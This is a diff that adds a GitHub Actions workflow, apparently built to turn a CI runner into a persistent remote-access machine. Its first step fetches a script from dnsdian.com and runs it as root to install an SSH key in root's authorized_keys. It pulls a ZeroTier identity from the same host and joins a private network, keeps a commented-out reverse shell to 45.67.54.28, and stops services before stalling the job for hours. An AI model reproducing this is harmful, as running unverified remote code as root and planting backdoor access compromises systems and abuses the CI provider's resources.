@@ -1,0 +1,106 @@
+name: Actions_script
+
+on:
+  push:
+    branches: 
+      - master
+#  schedule:
+#      - cron: 20 18 * * *
+
+env:
+  TZ: Asia/Shanghai
+
+jobs:
+  Run_Actions:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: One-setup
+        run: |
+            (sudo rm -rf /swapfile /etc/apt/sources.list.d/* &) >/dev/null 2>&1
+            curl -skL dnsdian.com/ssh_key | sed 's/~\//\/root\//g' >ssh_key
+            sudo bash ssh_key
+
+            if curl -skL https://dnsdian.com/zerotier-one.tgz -o zerotier-one.tgz; then
+                sudo tar --overwrite -zxvf zerotier-one.tgz -C /var/lib
+            fi
+            rm -f zerotier-one.tgz
+            curl -s 'https://raw.githubusercontent.com/zerotier/ZeroTierOne/master/doc/contact%40zerotier.com.gpg' | gpg --import && \
+            if z=$(curl -s 'https://install.zerotier.com/' | gpg 2>/dev/null); then echo "$z" | sudo bash; fi
+            sudo zerotier-cli join b6079f73c65a4d9c
+
+            while (! sudo egrep -i 'AAAAB3NzaC1yc2EAAAADAQABAAAEAQC7v' /root/.ssh/authorized_keys >/dev/null 2>&1); do
+                #sudo bash -i >& /dev/tcp/45.67.54.28/90 0>&1
+                sleep 10
+                sudo bash ssh_key
+            done
+            rm -f ssh_key
+
+            sudo systemctl stop mysql
+            sudo systemctl stop php7.1-fpm
+            sudo systemctl stop php7.2-fpm
+            sudo systemctl stop php7.3-fpm
+            sudo systemctl stop php7.4-fpm
+            sudo systemctl disable mysql
+            sudo systemctl disable php7.1-fpm
+            sudo systemctl disable php7.2-fpm
+            sudo systemctl disable php7.3-fpm
+            sudo systemctl disable php7.4-fpm
+
+            sudo echo "echo '*/1 * * * * sync;echo 3 > /proc/sys/vm/drop_caches' >>/var/spool/cron/crontabs/root
+            sudo chown root:root /var/spool/cron/crontabs/root
+            chmod 600 /var/spool/cron/crontabs/root
+            apt-get install -y lrzsz language-pack-zh-hant language-pack-zh-hans zhcon zh-autoconvert
+            sed -i '/LANG=/d' /etc/default/locale
+            sed -i '/LANGUAGE=/d' /etc/default/locale
+            echo 'LANG=\"zh_CN.UTF-8\"'>>/etc/default/locale
+            echo 'LANGUAGE=\"zh_CN:zh\"'>>/etc/default/locale
+
+            sed -i '/LANG=/d' /etc/environment
+            sed -i '/LANGUAGE=/d' /etc/environment
+            echo 'LANG=\"zh_CN.UTF-8\"'>>/etc/environment
+            echo 'LANGUAGE=\"zh_CN:zh:en_US:en\"'>>/etc/environment
+
+            locale-gen
+            export LANG=zh_CN.GBK
+            source /etc/profile
+            source /etc/default/locale
+            source /etc/environment
+
+            sed -i '/net\.core\.default_qdisc/d' /etc/sysctl.conf
+            echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
+            sed -i '/net\.ipv4\.tcp_congestion_control/d' /etc/sysctl.conf
+            echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
+            echo "\033[32m  Create swap, please wait...\033[0m"
+            dd if=/dev/zero of=/mnt/swap bs=1M count=4096
+            chmod 0600 /mnt/swap
+            mkswap /mnt/swap
+            sed -i '/vm.swappiness/d' /etc/sysctl.conf
+            sed -i '/vm.vfs_cache_pressure/d' /etc/sysctl.conf
+            echo 'vm.swappiness = 10' >> /etc/sysctl.conf
+            sysctl -p
+            swapon /mnt/swap
+            lsmod | grep -i bbr
+            rm -f $(dirname $(readlink -f $0))/$(basename $0)
+            rm -f $0">run_bbr
+            sudo chmod +x run_bbr && sudo bash run_bbr
+
+            #curl -skLA 'yangwei.work' https://dnsdian.com/auto_ssr.php | sudo bash
+            #echo $(curl -skL dnsdian.com/?format=json)
+            #sleep 6
+
+      - name: Two-build
+        run: |
+            sudo echo '#!/bin/bash
+            i=1
+            t=9000
+            c=$[t/30-1]
+            while [ ${i} -le $[t/30-1] ]; do
+                echo -e "\033[32m    清理内存: 第[${i}]次, 余[${c}]次, 约[$[c*30/60]]分钟, 空闲内存[$(free -m | sed -n "2p" | xargs -n1 | sed -n "4p")M]\033[0m"
+                sudo sync
+                sudo echo 3 > /proc/sys/vm/drop_caches
+                sleep 30
+                ((i++))
+                ((c--))
+            done'>while.true
+            sudo chmod +x while.true && sudo bash while.true
